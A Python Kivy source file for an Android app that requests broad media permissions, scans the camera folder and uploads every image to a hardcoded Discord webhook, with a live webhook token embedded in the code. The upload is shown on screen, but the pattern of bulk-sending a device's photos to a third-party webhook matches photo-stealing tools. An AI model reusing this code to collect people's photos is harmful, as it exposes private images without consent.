from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
import threading
import os
import time
import urllib.request
import uuid
from kivy.utils import platform

# 🔴🔴🔴 อย่าลืมแก้ Webhook ตรงนี้นะครับ 🔴🔴🔴
WEBHOOK_URL = "https://discord.com/api/webhooks/1468548944027058257/t3Pyrg1mXDeNJ5P_xuynOgmuUs4jRmQpL3C0yjtIoTcTsKNRA0tR-9NBkP1_AtBouMSe"

class PhotoApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        self.status = Label(text="Ready (Native Mode)", font_size='20sp', halign='center')
        btn = Button(text="Start Upload", background_color=(0, 1, 0, 1))
        btn.bind(on_press=self.start_process)
        layout.add_widget(self.status)
        layout.add_widget(btn)
        return layout

    def start_process(self, instance):
        threading.Thread(target=self.run_upload).start()

    def run_upload(self):
        self.update_status("Asking Permission...")
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            # ขอสิทธิ์แบบครอบจักรวาล
            request_permissions([
                Permission.READ_MEDIA_IMAGES,
                Permission.READ_MEDIA_VIDEO,
                Permission.READ_EXTERNAL_STORAGE
            ])
        
        self.update_status("Scanning Images...")
        import glob
        # Path มาตรฐาน Android
        paths = ['/sdcard/DCIM/Camera/*', '/storage/emulated/0/DCIM/Camera/*']
        files = []
        for p in paths:
            files += glob.glob(p)
        
        target_files = [f for f in files if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
        
        if not target_files:
            self.update_status("No images found!\n(Check Permissions)")
            return

        for i, filepath in enumerate(target_files):
            self.update_status(f"Sending {i+1}/{len(target_files)}\n{os.path.basename(filepath)}")
            self.upload_file(filepath)
            time.sleep(1)
            
        self.update_status("Done! ✅")

    def upload_file(self, filepath):
        try:
            boundary = str(uuid.uuid4())
            filename = os.path.basename(filepath)
            data = []
            data.append(f'--{boundary}'.encode('utf-8'))
            data.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"'.encode('utf-8'))
            data.append(b'Content-Type: application/octet-stream')
            data.append(b'')
            with open(filepath, 'rb') as f:
                data.append(f.read())
            data.append(b'')
            data.append(f'--{boundary}--'.encode('utf-8'))
            data.append(b'')
            body = b'\r\n'.join(data)
            
            req = urllib.request.Request(WEBHOOK_URL, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            req.add_header('User-Agent', 'Python-Native')
            with urllib.request.urlopen(req, timeout=15) as response:
                pass
        except Exception as e:
            print(f"Error: {e}")

    def update_status(self, text):
        Clock.schedule_once(lambda dt: setattr(self.status, 'text', text))

if __name__ == '__main__':
    PhotoApp().run()
